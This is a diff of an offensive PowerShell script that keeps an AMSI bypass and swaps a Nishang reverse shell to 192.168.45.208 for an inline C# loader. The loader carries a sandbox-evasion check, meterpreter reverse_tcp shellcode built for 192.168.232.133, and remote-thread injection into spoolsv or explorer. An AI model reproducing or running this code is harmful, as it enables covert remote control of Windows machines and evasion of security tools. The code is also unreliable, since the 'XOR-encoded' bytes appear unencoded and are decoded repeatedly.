@@ -1,131 +1,178 @@
 # Compact AMSI bypass
 [Ref].Assembly.GetType('System.Management.Automation.Amsi'+[char]85+'tils').GetField('ams'+[char]105+'InitFailed','NonPublic,Static').SetValue($null,$true)
 
-function Invoke-PowerShellTcp 
-{ 
-<#
-.SYNOPSIS
-Nishang script which can be used for Reverse or Bind interactive PowerShell from a target. 
+$source = @"
+using System;
+using System.Diagnostics;
+using System.Runtime.InteropServices;
+using System.Security.Principal;
 
-.DESCRIPTION
-This script is able to connect to a standard netcat listening on a port when using the -Reverse switch. 
-Also, a standard netcat can connect to this script Bind to a specific port.
-
-The script is derived from Powerfun written by Ben Turner & Dave Hardy
-
-.PARAMETER IPAddress
-The IP address to connect to when using the -Reverse switch.
-
-.PARAMETER Port
-The port to connect to when using the -Reverse switch. When using -Bind it is the port on which this script listens.
-
-.EXAMPLE
-PS > Invoke-PowerShellTcp -Reverse -IPAddress 192.168.254.226 -Port 4444
-
-Above shows an example of an interactive PowerShell reverse connect shell. A netcat/powercat listener must be listening on 
-the given IP and port. 
-
-.EXAMPLE
-PS > Invoke-PowerShellTcp -Bind -Port 4444
-
-Above shows an example of an interactive PowerShell bind connect shell. Use a netcat/powercat to connect to this port. 
-
-.EXAMPLE
-PS > Invoke-PowerShellTcp -Reverse -IPAddress fe80::20c:29ff:fe9d:b983 -Port 4444
-
-Above shows an example of an interactive PowerShell reverse connect shell over IPv6. A netcat/powercat listener must be
-listening on the given IP and port. 
-
-.LINK
-http://www.labofapenetrationtester.com/2015/05/week-of-powershell-shells-day-1.html
-https://github.com/nettitude/powershell/blob/master/powerfun.ps1
-https://github.com/samratashok/nishang
-#>      
-    [CmdletBinding(DefaultParameterSetName="reverse")] Param(
-
-        [Parameter(Position = 0, Mandatory = $true, ParameterSetName="reverse")]
-        [Parameter(Position = 0, Mandatory = $false, ParameterSetName="bind")]
-        [String]
-        $IPAddress,
-
-        [Parameter(Position = 1, Mandatory = $true, ParameterSetName="reverse")]
-        [Parameter(Position = 1, Mandatory = $true, ParameterSetName="bind")]
-        [Int]
-        $Port,
-
-        [Parameter(ParameterSetName="reverse")]
-        [Switch]
-        $Reverse,
-
-        [Parameter(ParameterSetName="bind")]
-        [Switch]
-        $Bind
-
-    )
-
-    
-    try 
+namespace RemoteShinject
+{
+    public class Program
     {
-        #Connect back if the reverse switch is used.
-        if ($Reverse)
+        [Flags]
+        public enum ProcessAccessFlags : uint
         {
-            $client = New-Object System.Net.Sockets.TCPClient($IPAddress,$Port)
+            All = 0x001F0FFF
+        }
+        [Flags]
+        public enum AllocationType
+        {
+            Commit = 0x1000,
+            Reserve = 0x2000
         }
 
-        #Bind to the provided port if Bind switch is used.
-        if ($Bind)
+        [Flags]
+        public enum MemoryProtection
         {
-            $listener = [System.Net.Sockets.TcpListener]$Port
-            $listener.start()    
-            $client = $listener.AcceptTcpClient()
-        } 
+            ExecuteReadWrite = 0x40
+        }
 
-        $stream = $client.GetStream()
-        [byte[]]$bytes = 0..65535|%{0}
+        [DllImport("kernel32.dll", SetLastError = true)]
+        public static extern IntPtr OpenProcess(ProcessAccessFlags processAccess, bool bInheritHandle, int processId);
 
-        #Send back current username and computername
-        $sendbytes = ([text.encoding]::ASCII).GetBytes("Windows PowerShell running as user " + $env:username + " on " + $env:computername + "`nCopyright (C) 2015 Microsoft Corporation. All rights reserved.`n`n")
-        $stream.Write($sendbytes,0,$sendbytes.Length)
+        [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
+        static extern IntPtr VirtualAllocEx(IntPtr hProcess, IntPtr lpAddress, uint dwSize, AllocationType flAllocationType, MemoryProtection flProtect);
 
-        #Show an interactive PowerShell prompt
-        $sendbytes = ([text.encoding]::ASCII).GetBytes('PS ' + (Get-Location).Path + '>')
-        $stream.Write($sendbytes,0,$sendbytes.Length)
+        [DllImport("kernel32.dll", SetLastError = true)]
+        public static extern bool WriteProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, byte[] lpBuffer, Int32 nSize, out IntPtr lpNumberOfBytesWritten);
 
-        while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0)
+        [DllImport("kernel32.dll")]
+        static extern IntPtr CreateRemoteThread(IntPtr hProcess, IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);
+
+        [System.Runtime.InteropServices.DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
+        static extern IntPtr VirtualAllocExNuma(IntPtr hProcess, IntPtr lpAddress, uint dwSize, UInt32 flAllocationType, UInt32 flProtect, UInt32 nndPreferred);
+
+        [System.Runtime.InteropServices.DllImport("kernel32.dll")]
+        static extern IntPtr GetCurrentProcess();
+
+        static bool IsElevated
         {
-            $EncodedText = New-Object -TypeName System.Text.ASCIIEncoding
-            $data = $EncodedText.GetString($bytes,0, $i)
-            try
+            get
             {
-                #Execute the command on the target.
-                $sendback = (Invoke-Expression -Command $data 2>&1 | Out-String )
+                return WindowsIdentity.GetCurrent().Owner.IsWellKnown(WellKnownSidType.BuiltinAdministratorsSid);
             }
-            catch
-            {
-                Write-Warning "Something went wrong with execution of command on the target." 
-                Write-Error $_
-            }
-            $sendback2  = $sendback + 'PS ' + (Get-Location).Path + '> '
-            $x = ($error[0] | Out-String)
-            $error.clear()
-            $sendback2 = $sendback2 + $x
+        }
 
-            #Return the results
-            $sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2)
-            $stream.Write($sendbyte,0,$sendbyte.Length)
-            $stream.Flush()  
-        }
-        $client.Close()
-        if ($listener)
+        public static void Main()
         {
-            $listener.Stop()
+            // Sandbox evasion
+            IntPtr mem = VirtualAllocExNuma(GetCurrentProcess(), IntPtr.Zero, 0x1000, 0x3000, 0x4, 0);
+            if (mem == null)
+            {
+                return;
+            }
+
+            // Xor-encoded payload, key 0xfa
+            // msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.232.133 LPORT=443 EXITFUNC=thread -f csharp
+            byte[] buf = new byte[511] {0xfc,0x48,0x83,0xe4,0xf0,0xe8,
+            0xcc,0x00,0x00,0x00,0x41,0x51,0x41,0x50,0x52,0x51,0x48,0x31,
+            0xd2,0x56,0x65,0x48,0x8b,0x52,0x60,0x48,0x8b,0x52,0x18,0x48,
+            0x8b,0x52,0x20,0x48,0x0f,0xb7,0x4a,0x4a,0x48,0x8b,0x72,0x50,
+            0x4d,0x31,0xc9,0x48,0x31,0xc0,0xac,0x3c,0x61,0x7c,0x02,0x2c,
+            0x20,0x41,0xc1,0xc9,0x0d,0x41,0x01,0xc1,0xe2,0xed,0x52,0x41,
+            0x51,0x48,0x8b,0x52,0x20,0x8b,0x42,0x3c,0x48,0x01,0xd0,0x66,
+            0x81,0x78,0x18,0x0b,0x02,0x0f,0x85,0x72,0x00,0x00,0x00,0x8b,
+            0x80,0x88,0x00,0x00,0x00,0x48,0x85,0xc0,0x74,0x67,0x48,0x01,
+            0xd0,0x44,0x8b,0x40,0x20,0x50,0x8b,0x48,0x18,0x49,0x01,0xd0,
+            0xe3,0x56,0x4d,0x31,0xc9,0x48,0xff,0xc9,0x41,0x8b,0x34,0x88,
+            0x48,0x01,0xd6,0x48,0x31,0xc0,0xac,0x41,0xc1,0xc9,0x0d,0x41,
+            0x01,0xc1,0x38,0xe0,0x75,0xf1,0x4c,0x03,0x4c,0x24,0x08,0x45,
+            0x39,0xd1,0x75,0xd8,0x58,0x44,0x8b,0x40,0x24,0x49,0x01,0xd0,
+            0x66,0x41,0x8b,0x0c,0x48,0x44,0x8b,0x40,0x1c,0x49,0x01,0xd0,
+            0x41,0x8b,0x04,0x88,0x41,0x58,0x41,0x58,0x48,0x01,0xd0,0x5e,
+            0x59,0x5a,0x41,0x58,0x41,0x59,0x41,0x5a,0x48,0x83,0xec,0x20,
+            0x41,0x52,0xff,0xe0,0x58,0x41,0x59,0x5a,0x48,0x8b,0x12,0xe9,
+            0x4b,0xff,0xff,0xff,0x5d,0x49,0xbe,0x77,0x73,0x32,0x5f,0x33,
+            0x32,0x00,0x00,0x41,0x56,0x49,0x89,0xe6,0x48,0x81,0xec,0xa0,
+            0x01,0x00,0x00,0x49,0x89,0xe5,0x49,0xbc,0x02,0x00,0x01,0xbb,
+            0xc0,0xa8,0x2d,0xae,0x41,0x54,0x49,0x89,0xe4,0x4c,0x89,0xf1,
+            0x41,0xba,0x4c,0x77,0x26,0x07,0xff,0xd5,0x4c,0x89,0xea,0x68,
+            0x01,0x01,0x00,0x00,0x59,0x41,0xba,0x29,0x80,0x6b,0x00,0xff,
+            0xd5,0x6a,0x0a,0x41,0x5e,0x50,0x50,0x4d,0x31,0xc9,0x4d,0x31,
+            0xc0,0x48,0xff,0xc0,0x48,0x89,0xc2,0x48,0xff,0xc0,0x48,0x89,
+            0xc1,0x41,0xba,0xea,0x0f,0xdf,0xe0,0xff,0xd5,0x48,0x89,0xc7,
+            0x6a,0x10,0x41,0x58,0x4c,0x89,0xe2,0x48,0x89,0xf9,0x41,0xba,
+            0x99,0xa5,0x74,0x61,0xff,0xd5,0x85,0xc0,0x74,0x0a,0x49,0xff,
+            0xce,0x75,0xe5,0xe8,0x93,0x00,0x00,0x00,0x48,0x83,0xec,0x10,
+            0x48,0x89,0xe2,0x4d,0x31,0xc9,0x6a,0x04,0x41,0x58,0x48,0x89,
+            0xf9,0x41,0xba,0x02,0xd9,0xc8,0x5f,0xff,0xd5,0x83,0xf8,0x00,
+            0x7e,0x55,0x48,0x83,0xc4,0x20,0x5e,0x89,0xf6,0x6a,0x40,0x41,
+            0x59,0x68,0x00,0x10,0x00,0x00,0x41,0x58,0x48,0x89,0xf2,0x48,
+            0x31,0xc9,0x41,0xba,0x58,0xa4,0x53,0xe5,0xff,0xd5,0x48,0x89,
+            0xc3,0x49,0x89,0xc7,0x4d,0x31,0xc9,0x49,0x89,0xf0,0x48,0x89,
+            0xda,0x48,0x89,0xf9,0x41,0xba,0x02,0xd9,0xc8,0x5f,0xff,0xd5,
+            0x83,0xf8,0x00,0x7d,0x28,0x58,0x41,0x57,0x59,0x68,0x00,0x40,
+            0x00,0x00,0x41,0x58,0x6a,0x00,0x5a,0x41,0xba,0x0b,0x2f,0x0f,
+            0x30,0xff,0xd5,0x57,0x59,0x41,0xba,0x75,0x6e,0x4d,0x61,0xff,
+            0xd5,0x49,0xff,0xce,0xe9,0x3c,0xff,0xff,0xff,0x48,0x01,0xc3,
+            0x48,0x29,0xc6,0x48,0x85,0xf6,0x75,0xb4,0x41,0xff,0xe7,0x58,
+            0x6a,0x00,0x59,0xbb,0xe0,0x1d,0x2a,0x0a,0x41,0x89,0xda,0xff,
+            0xd5};
+
+
+
+            int len = buf.Length;
+
+            // Parse arguments, if given (process to inject)
+            String procName = "";
+
+
+                // Inject based on elevation level
+                if (IsElevated)
+                {
+                    Console.WriteLine("Process is elevated.");
+                    procName = "spoolsv";
+                } 
+                else
+                {
+                    Console.WriteLine("Process is not elevated.");
+                    procName = "explorer";
+                }
+
+            //Console.WriteLine("Attempting to inject into {procName} process...");
+
+            // Get process IDs
+            Process[] expProc = Process.GetProcessesByName(procName);
+
+            // If multiple processes exist, try to inject in all of them
+            for (int i = 0; i < expProc.Length; i++)
+            {
+                int pid = expProc[i].Id;
+
+                // Get a handle on the process
+                IntPtr hProcess = OpenProcess(ProcessAccessFlags.All, false, pid);
+                if ((int)hProcess == 0)
+                {
+                    //Console.WriteLine("Failed to get handle on PID {pid}.");
+                    continue;
+                }
+                //Console.WriteLine("Got handle {hProcess} on PID {pid}.");
+
+                // Allocate memory in the remote process
+                IntPtr expAddr = VirtualAllocEx(hProcess, IntPtr.Zero, (uint)len, AllocationType.Commit | AllocationType.Reserve, MemoryProtection.ExecuteReadWrite);
+                //Console.WriteLine("Allocated {len} bytes at address {expAddr} in remote process.");
+
+                // Decode the payload
+                for (int j = 0; j < buf.Length; j++)
+                {
+                    buf[j] = (byte)((uint)buf[j] ^ 0xfa);
+                }
+
+                // Write the payload to the allocated bytes
+                IntPtr bytesWritten;
+                bool procMemResult = WriteProcessMemory(hProcess, expAddr, buf, len, out bytesWritten);
+                //Console.WriteLine("Wrote {bytesWritten} payload bytes (result: {procMemResult}).");
+
+                IntPtr threadAddr = CreateRemoteThread(hProcess, IntPtr.Zero, 0, expAddr, IntPtr.Zero, 0, IntPtr.Zero);
+                //Console.WriteLine("Created remote thread at {threadAddr}. Check your listener!");
+                break;
+            }
         }
-    }
-    catch
-    {
-        Write-Warning "Something went wrong! Check if the server is reachable and you are using the correct port." 
-        Write-Error $_
     }
 }
+"@;
 
-Invoke-PowerShellTcp -Reverse -IPAddress 192.168.45.208 -Port 8080
+Add-Type -TypeDefinition $source -Language CSharp;
+[RemoteShinject.Program]::Main()
